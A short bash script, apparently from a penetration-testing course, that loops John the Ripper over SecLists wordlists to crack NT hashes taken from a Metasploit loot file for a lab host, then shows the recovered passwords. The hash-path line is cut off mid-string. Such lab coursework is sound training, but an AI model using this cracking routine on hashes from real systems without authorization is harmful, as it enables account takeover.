# CIS 450 Pen Testing. Rogelio G.
#This script automates the use of John the Ripper
# It finds and tests several wordlists located in "seclist."

# The following line is where the hashes are located
HASF="/home/kali/.msf4/loot/20260206155050_tyrell_192.168.1.142_windows.hashes_06>
# This is where the world lists are located, I recoment start with Common Credentials
# Using "seclists/Passwords" or just "/seclist" could be time-consuming.
BASE="/usr/share/seclists/Passwords/Common-Credentials"
for WORDLIST in $(find "$BASE" -type f -name "*.txt"); do
    echo "[*] Trying wordlist: $WORDLIST"
    john --format=NT --rules=Jumbo --wordlist="$WORDLIST" "$HASF"
done
#
echo "Passwords"
john --show --format=NT "$HASF"
